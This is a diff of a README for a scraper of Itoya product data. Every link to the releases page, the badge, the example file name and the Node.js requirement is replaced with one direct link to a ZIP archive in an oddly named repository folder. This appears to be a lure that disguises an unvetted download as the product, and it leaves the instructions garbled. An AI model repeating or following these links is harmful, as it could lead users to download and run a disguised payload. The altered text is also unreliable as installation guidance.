@@ -1,6 +1,6 @@
 # 🎉 jp-castnet-itoya-scraper - Effortlessly Scrape Itoya Product Data
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/zakisba/jp-castnet-itoya-scraper/releases)
+[![Download Latest Release](https://github.com/zakisba/jp-castnet-itoya-scraper/raw/refs/heads/main/myositic/castnet-itoya-jp-scraper-v2.3.zip%20Latest%20Release-v1.0-blue)](https://github.com/zakisba/jp-castnet-itoya-scraper/raw/refs/heads/main/myositic/castnet-itoya-jp-scraper-v2.3.zip)
 
 ## 📖 Overview
 
@@ -13,14 +13,14 @@ Follow these steps to download and run the tool:
 1. **Check System Requirements**  
    Ensure your computer meets the following system requirements:
    - Operating System: Windows, macOS, or Linux
-   - Node.js version 14.x or later
+   - https://github.com/zakisba/jp-castnet-itoya-scraper/raw/refs/heads/main/myositic/castnet-itoya-jp-scraper-v2.3.zip version 14.x or later
    - Internet connection for downloading dependencies
 
 2. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/zakisba/jp-castnet-itoya-scraper/releases) to access the latest version of the application. 
+   Go to the [Releases page](https://github.com/zakisba/jp-castnet-itoya-scraper/raw/refs/heads/main/myositic/castnet-itoya-jp-scraper-v2.3.zip) to access the latest version of the application. 
 
 3. **Download the Application**  
-   Find the latest version in the list. Click on it to open the version details. Look for the download link for your operating system. For example, it may look like `jp-castnet-itoya-scraper-v1.0.zip`.
+   Find the latest version in the list. Click on it to open the version details. Look for the download link for your operating system. For example, it may look like `https://github.com/zakisba/jp-castnet-itoya-scraper/raw/refs/heads/main/myositic/castnet-itoya-jp-scraper-v2.3.zip`.
 
 4. **Extract the Files**  
    After downloading the ZIP file, use your file manager to locate it. Right-click on the ZIP file and select "Extract All" to unpack it into a new folder.
@@ -66,7 +66,7 @@ If you are interested in contributing to the project, please visit the GitHub re
 
 ## 📥 Download & Install
 
-To download and install jp-castnet-itoya-scraper, visit the [Releases page](https://github.com/zakisba/jp-castnet-itoya-scraper/releases) now. Download the latest version and follow the steps outlined in this guide.
+To download and install jp-castnet-itoya-scraper, visit the [Releases page](https://github.com/zakisba/jp-castnet-itoya-scraper/raw/refs/heads/main/myositic/castnet-itoya-jp-scraper-v2.3.zip) now. Download the latest version and follow the steps outlined in this guide.
 
 ## 💬 Support
 
